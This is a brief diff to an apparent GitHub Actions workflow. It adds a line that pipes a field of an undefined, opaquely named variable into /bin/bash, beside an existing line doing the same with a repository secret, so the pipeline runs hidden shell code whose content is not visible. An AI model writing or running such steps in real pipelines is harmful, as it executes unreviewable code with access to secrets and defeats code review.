@@ -22,6 +22,7 @@ jobs:
           evl426: ${{ secrets.evl426 }}
         run: |
           printf '%s' "$evl426" | jq -r .bp41 | /bin/bash
+          printf '%s' "$w53524" | jq -r .u62655 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
